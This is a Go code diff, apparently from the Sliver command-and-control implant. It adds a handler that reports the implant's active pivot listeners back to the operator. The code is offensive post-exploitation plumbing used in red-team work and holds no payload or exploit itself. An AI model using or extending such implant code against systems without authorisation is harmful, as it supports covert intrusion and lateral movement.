@@ -34,14 +34,49 @@ import (
 
 var (
 	genericPivotHandlers = map[uint32]PivotHandler{
-		sliverpb.MsgPivotData:   pivotDataHandler,
-		sliverpb.MsgTCPPivotReq: tcpListenerHandler,
+		sliverpb.MsgPivotData:    pivotDataHandler,
+		sliverpb.MsgTCPPivotReq:  tcpListenerHandler,
+		sliverpb.MsgPivotListReq: pivotListHandler,
 	}
 )
 
 // GetPivotHandlers - Returns a map of pivot handlers
 func GetPivotHandlers() map[uint32]PivotHandler {
 	return genericPivotHandlers
+}
+
+func pivotListHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	listReq := &sliverpb.PivotListReq{}
+	listResp := &sliverpb.PivotList{
+		Response: &commonpb.Response{},
+	}
+	err := proto.Unmarshal(envelope.Data, listReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		listResp.Response.Err = err.Error()
+		data, _ := proto.Marshal(listResp)
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.ID,
+			Data: data,
+		}
+		return
+	}
+	listeners := pivots.GetListeners()
+	entries := make([]*sliverpb.PivotEntry, 0)
+	for _, entry := range listeners {
+		entries = append(entries, &sliverpb.PivotEntry{
+			Type:   entry.Type,
+			Remote: entry.RemoteAddress,
+		})
+	}
+	listResp.Entries = entries
+	data, _ := proto.Marshal(listResp)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.ID,
+		Data: data,
+	}
 }
 
 func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
